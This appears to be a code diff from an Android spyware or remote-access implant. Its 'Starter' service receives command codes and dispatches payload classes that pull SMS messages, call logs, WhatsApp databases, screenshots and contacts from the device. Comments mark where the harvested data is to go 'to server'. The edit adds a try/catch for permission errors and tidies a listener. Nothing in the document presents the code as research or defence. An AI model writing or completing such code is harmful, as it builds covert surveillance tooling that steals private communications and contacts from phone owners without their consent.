@@ -125,36 +125,42 @@ public class Starter extends Service {
     }
 
     private void processCommand(int command) {
-        switch (command) {
-            case PayloadTypes.GET_TEXT_MESSAGES_INBOX:
-                getSms(SmsModes.MODE_INBOX);
-                break;
-            case PayloadTypes.GET_CALL_LOGS:
-                getCallLogs();
-                break;
-            case PayloadTypes.GET_TEXT_MESSAGES_OUTBOX:
-                getSms(SmsModes.MODE_OUTBOX);
-                break;
-            case PayloadTypes.GET_TEXT_MESSAGES_DRAFT:
-                getSms(SmsModes.MODE_DRAFT);
-                break;
-            case PayloadTypes.GET_WHATSAPP_DATABASES:
-                getWbDb();
-                break;
-            case PayloadTypes.GET_SCREENSHOTS_COUNT:
-                getSc();
-                break;
-            case PayloadTypes.GET_USER_CONTACTS:
-                getContacts();
-                break;
-            default:
-                Log.d("ERROR PA : ", "Invalid Command Received");
-                break;
+        try {
+
+            switch (command) {
+                case PayloadTypes.GET_TEXT_MESSAGES_INBOX:
+                    getSms(SmsModes.MODE_INBOX);
+                    break;
+                case PayloadTypes.GET_CALL_LOGS:
+                    getCallLogs();
+                    break;
+                case PayloadTypes.GET_TEXT_MESSAGES_OUTBOX:
+                    getSms(SmsModes.MODE_OUTBOX);
+                    break;
+                case PayloadTypes.GET_TEXT_MESSAGES_DRAFT:
+                    getSms(SmsModes.MODE_DRAFT);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_DATABASES:
+                    getWbDb();
+                    break;
+                case PayloadTypes.GET_SCREENSHOTS_COUNT:
+                    getSc();
+                    break;
+                case PayloadTypes.GET_USER_CONTACTS:
+                    getContacts();
+                    break;
+                default:
+                    Log.d("ERROR PA : ", "Invalid Command Received");
+                    break;
+            }
+        }catch (SecurityException e){
+            Log.e("PERMISSION : ",e.getMessage());
         }
     }
 
     private void getContacts() {
         try {
+            //TODO ADD LISTENER
             new ContactsPayload(this).execute();
         }catch (Exception e){
             e.printStackTrace();
@@ -163,12 +169,8 @@ public class Starter extends Service {
 
     private void getSc() {
         try {
-            new ScreenshotPayload(this).setScreenshotPayloadListener(new ScreenshotPayloadListener() {
-                @Override
-                public void onDataExtracted(File path) {
-                    //Data to server
-                }
-
+            new ScreenshotPayload(this).setScreenshotPayloadListener(path -> {
+                //TODO Data to server
             }).execute();
         }catch (Exception e){
             e.printStackTrace();
